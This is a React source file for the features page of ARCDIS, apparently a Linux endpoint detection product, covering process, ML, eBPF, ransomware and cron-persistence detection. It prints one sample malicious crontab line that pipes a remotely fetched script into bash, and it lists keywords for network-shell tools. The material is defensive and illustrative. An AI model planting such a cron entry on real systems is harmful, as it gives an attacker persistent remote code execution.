import React, { useRef } from 'react';
import { Link } from 'react-router-dom';
import { motion, useInView } from 'framer-motion';
import {
  GitBranch, Cpu, Radio, FileWarning, Lock, Zap, Shield,
  ChevronRight, CheckCircle, Terminal, Activity, Eye, Server
} from 'lucide-react';

const fadeUp = { hidden: { opacity: 0, y: 24 }, visible: { opacity: 1, y: 0, transition: { duration: 0.55, ease: 'easeOut' } } };
const stagger = { visible: { transition: { staggerChildren: 0.1 } } };

function AnimatedSection({ children, className = '' }) {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: true, margin: '-60px' });
  return (
    <motion.div ref={ref} variants={stagger} initial="hidden" animate={isInView ? 'visible' : 'hidden'} className={className}>
      {children}
    </motion.div>
  );
}

const features = [
  {
    id: 'process',
    icon: <GitBranch className="h-8 w-8" />,
    color: 'text-accent',
    border: 'border-accent/25',
    bg: 'bg-accent/8',
    glow: 'shadow-glow-accent',
    title: 'Behavioral Process Monitoring',
    tagline: 'Understand what your processes are actually doing.',
    desc: 'Every process on a monitored endpoint is tracked from creation. ARCDIS builds a real-time model of parent-child relationships, spawn rates, CPU consumption, and memory footprint to identify abnormal behavior.',
    bullets: [
      'Process storm detection — flags rapid child process creation',
      'Execution chain analysis — suspicious bash → python → nc patterns',
      'CPU spike detection — sustained high utilization anomalies',
      'Memory anomaly scoring — deviation from process baseline',
      'Web server injection detection — nginx/apache spawning shells',
    ],
    code: `# Example detection event
{
  "behavior_type": "process_storm",
  "parent_process": "bash",
  "parent_pid": 4821,
  "child_count": 23,
  "spawn_rate": "2.3/s",
  "ml_anomaly_score": 0.94,
  "risk_tier": "HIGH"
}`,
  },
  {
    id: 'ml',
    icon: <Cpu className="h-8 w-8" />,
    color: 'text-primary',
    border: 'border-primary/25',
    bg: 'bg-primary/8',
    glow: 'shadow-glow',
    title: 'Machine Learning Detection',
    tagline: 'Six trained models. One goal: find what shouldn\'t be there.',
    desc: 'ARCDIS uses Isolation Forest models trained on normal Linux system behavior. Each model specializes in a different data domain, giving multi-dimensional coverage with low false-positive rates.',
    bullets: [
      'Process tree model — parent/child topology anomalies',
      'Individual process model — per-process resource behavior',
      'Filesystem model — write rate, entropy, directory patterns',
      'eBPF model — syscall frequency and ordering',
      'Cron model — scheduled task content scoring',
      'All models run locally — no cloud dependency',
    ],
    code: `# Models loaded at agent startup
local_tree_model.pkl       # Process tree anomalies
local_process_model.pkl    # Individual process behavior
local_fs_model.pkl         # Filesystem activity
local_ebpf_model.pkl       # Kernel syscall patterns
local_cron_model.pkl       # Cron job content`,
  },
  {
    id: 'ebpf',
    icon: <Radio className="h-8 w-8" />,
    color: 'text-purple-400',
    border: 'border-purple-500/25',
    bg: 'bg-purple-500/8',
    glow: '',
    title: 'eBPF Kernel Visibility',
    tagline: 'See what userspace monitoring misses.',
    desc: 'Extended Berkeley Packet Filter (eBPF) allows ARCDIS to attach to kernel hooks and observe system calls, network events, and file operations at the lowest possible level — without modifying the kernel.',
    bullets: [
      'Syscall tracing — execve, open, connect, bind monitoring',
      'Network event correlation — outbound connection detection',
      'File descriptor tracking — detect open/read/write patterns',
      'Process execution tracing — catch injected code execution',
      'Low overhead — eBPF runs in kernel JIT, minimal CPU cost',
    ],
    code: `# eBPF monitor startup
[INFO] Attaching eBPF probes...
[INFO] Probe: sys_execve    → attached
[INFO] Probe: sys_connect   → attached
[INFO] Probe: sys_open      → attached
[INFO] eBPF monitor active`,
  },
  {
    id: 'ransomware',
    icon: <FileWarning className="h-8 w-8" />,
    color: 'text-danger',
    border: 'border-danger/25',
    bg: 'bg-danger/8',
    glow: '',
    title: 'Ransomware Detection',
    tagline: 'Stop mass encryption before the damage is done.',
    desc: 'ARCDIS continuously monitors protected directories for write rate anomalies that indicate encryption-in-progress behavior. When triggered, the threat is quarantined within seconds.',
    bullets: [
      'Protected directories: /home, /tmp, Desktop, Documents',
      'Write rate monitoring — files/second threshold',
      'Entropy analysis — high entropy output = likely encrypted',
      'Quarantine action — process suspended, files isolated',
      'Zero-tolerance policy — immediate QUARANTINE_AND_TERMINATE',
    ],
    code: `# Ransomware detection event
{
  "behavior_type": "ransomware",
  "process": "encrypt.py",
  "files_modified": 821,
  "write_rate": "41/s",
  "entropy_score": 7.9,
  "action": "QUARANTINE_AND_TERMINATE"
}`,
  },
  {
    id: 'persistence',
    icon: <Lock className="h-8 w-8" />,
    color: 'text-warning',
    border: 'border-warning/25',
    bg: 'bg-warning/8',
    glow: '',
    title: 'Persistence Detection',
    tagline: 'Find attacker footholds before they become backdoors.',
    desc: 'Attackers establish persistence through scheduled tasks. ARCDIS scans all user crontabs on startup and periodically, scoring each entry against a multi-factor model to identify malicious entries.',
    bullets: [
      'Full user crontab scanning — root and all UID ≥ 1000 users',
      'Keyword scoring — wget, curl, nc, bash -c, /tmp, base64',
      'Shannon entropy analysis — obfuscated commands score higher',
      'Network pattern detection — IP addresses, reverse shell patterns',
      'ML scoring — IsolationForest trained on malicious cron patterns',
    ],
    code: `# Detected malicious cron entry
*/5 * * * * curl http://10.10.10.1/s.sh | bash

{
  "entropy": 4.2,
  "keyword_score": 3,
  "ml_score": 0.87,
  "action": "REMOVE_AND_ALERT"
}`,
  },
  {
    id: 'response',
    icon: <Zap className="h-8 w-8" />,
    color: 'text-orange-400',
    border: 'border-orange-500/25',
    bg: 'bg-orange-500/8',
    glow: '',
    title: 'Automated Response',
    tagline: 'The right action, automatically, at machine speed.',
    desc: 'ARCDIS\'s policy engine maps each risk tier and behavior type to a specific response action. The agent acts in milliseconds — no human in the loop required for high-confidence threats.',
    bullets: [
      'MONITOR_ONLY — suspicious but below threshold, deferred to cloud',
      'TERMINATE_SINGLE_PROCESS — single high-anomaly process killed',
      'TERMINATE_PROCESS_TREE — parent + all descendants terminated',
      'QUARANTINE_AND_TERMINATE — files isolated, process tree killed',
      'All actions logged and reported as attack telemetry events',
    ],
    code: `# policies.json (excerpt)
{
  "trigger": {
    "risk_tier": "HIGH",
    "behavior_type": "ransomware"
  },
  "action": "QUARANTINE_AND_TERMINATE",
  "reason": "Mass file encryption in protected directories."
}`,
  },
];

export const Features = () => (
  <div className="min-h-screen bg-background">
    {/* Hero */}
    <section className="relative pt-32 pb-20 overflow-hidden">
      <div className="absolute inset-0 grid-bg opacity-50" />
      <div className="absolute inset-0 hero-bg" />
      <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }}>
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-primary/30 bg-primary/5 text-xs font-mono text-primary mb-6">
            <Shield className="h-3.5 w-3.5" /> PLATFORM CAPABILITIES
          </div>
          <h1 className="text-5xl sm:text-6xl font-black text-white mb-6 leading-tight">
            Every threat vector, <span className="text-gradient">detected.</span>
          </h1>
          <p className="text-lg text-text_muted max-w-2xl mx-auto mb-8">
            Six specialized detection engines working in concert to protect Linux endpoints from process abuse, persistence, ransomware, cryptomining, and low-level kernel exploits.
          </p>
          <div className="flex items-center justify-center gap-4">
            <Link to="/register" className="inline-flex items-center gap-2 px-6 py-3 bg-primary text-background font-bold rounded-xl hover:bg-primary_dark transition-all shadow-glow text-sm">
              Launch Console <ChevronRight className="h-4 w-4" />
            </Link>
            <Link to="/architecture" className="inline-flex items-center gap-2 px-6 py-3 border border-border-bright text-sm font-medium text-text rounded-xl hover:border-primary/40 transition-colors">
              View Architecture
            </Link>
          </div>
        </motion.div>
      </div>
    </section>

    {/* Feature overview strip */}
    <section className="border-y border-border-bright/20 bg-surface/20 py-6">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex flex-wrap items-center justify-center gap-6">
          {features.map(f => (
            <a key={f.id} href={`#${f.id}`} className={`flex items-center gap-2 text-sm ${f.color} hover:opacity-80 transition-opacity`}>
              <span className="opacity-80">{React.cloneElement(f.icon, { className: 'h-4 w-4' })}</span>
              {f.title.split(' ').slice(0, 2).join(' ')}
            </a>
          ))}
        </div>
      </div>
    </section>

    {/* Feature deep dives */}
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 space-y-24">
      {features.map((f, idx) => (
        <AnimatedSection key={f.id}>
          <div id={f.id} className={`grid lg:grid-cols-2 gap-12 items-start ${idx % 2 === 1 ? 'lg:flex-row-reverse' : ''}`}>
            {/* Text */}
            <div className={idx % 2 === 1 ? 'lg:order-2' : ''}>
              <motion.div variants={fadeUp} className={`inline-flex items-center gap-2 px-3 py-1 rounded-full border ${f.border} ${f.bg} text-xs font-mono ${f.color} mb-5`}>
                {React.cloneElement(f.icon, { className: 'h-3.5 w-3.5' })}
                DETECTION MODULE
              </motion.div>
              <motion.h2 variants={fadeUp} className="text-3xl sm:text-4xl font-black text-white mb-3">{f.title}</motion.h2>
              <motion.p variants={fadeUp} className={`text-base font-medium ${f.color} mb-5`}>{f.tagline}</motion.p>
              <motion.p variants={fadeUp} className="text-text_muted leading-relaxed mb-7">{f.desc}</motion.p>
              <motion.ul variants={fadeUp} className="space-y-3">
                {f.bullets.map(b => (
                  <li key={b} className="flex items-start gap-3">
                    <CheckCircle className="h-5 w-5 text-primary mt-0.5 flex-shrink-0" />
                    <span className="text-sm text-text_muted">{b}</span>
                  </li>
                ))}
              </motion.ul>
            </div>

            {/* Code block */}
            <motion.div variants={fadeUp} className={`relative ${idx % 2 === 1 ? 'lg:order-1' : ''}`}>
              <div className={`absolute -inset-2 ${f.bg} rounded-2xl blur-xl opacity-60`} />
              <div className={`relative rounded-2xl border ${f.border} bg-background/80 overflow-hidden shadow-card`}>
                <div className="flex items-center gap-2 px-4 py-3 border-b border-border-bright/20 bg-surface/40">
                  <div className="flex gap-1.5">
                    <span className="w-3 h-3 rounded-full bg-danger/50" />
                    <span className="w-3 h-3 rounded-full bg-warning/50" />
                    <span className="w-3 h-3 rounded-full bg-primary/50" />
                  </div>
                  <span className="text-xs font-mono text-text_muted ml-2">detection output</span>
                </div>
                <pre className="p-6 text-xs font-mono text-slate-300 overflow-x-auto leading-relaxed whitespace-pre-wrap">
                  {f.code}
                </pre>
              </div>
            </motion.div>
          </div>
        </AnimatedSection>
      ))}
    </div>

    {/* CTA */}
    <section className="border-t border-border-bright/20 py-20">
      <div className="max-w-3xl mx-auto px-4 text-center">
        <AnimatedSection>
          <motion.h2 variants={fadeUp} className="text-4xl font-black text-white mb-4">
            Ready to see it in action?
          </motion.h2>
          <motion.p variants={fadeUp} className="text-text_muted mb-8">
            Deploy ARCDIS on a Linux endpoint and start monitoring in minutes.
          </motion.p>
          <motion.div variants={fadeUp} className="flex flex-col sm:flex-row gap-4 justify-center">
            <Link to="/register" className="inline-flex items-center justify-center gap-2 px-8 py-3.5 bg-primary text-background font-bold rounded-xl hover:bg-primary_dark shadow-glow transition-all">
              Launch Console <ChevronRight className="h-4 w-4" />
            </Link>
            <Link to="/docs" className="inline-flex items-center justify-center gap-2 px-8 py-3.5 border border-border-bright text-sm font-medium text-text rounded-xl hover:border-primary/40 transition-colors">
              Read Documentation
            </Link>
          </motion.div>
        </AnimatedSection>
      </div>
    </section>
  </div>
);
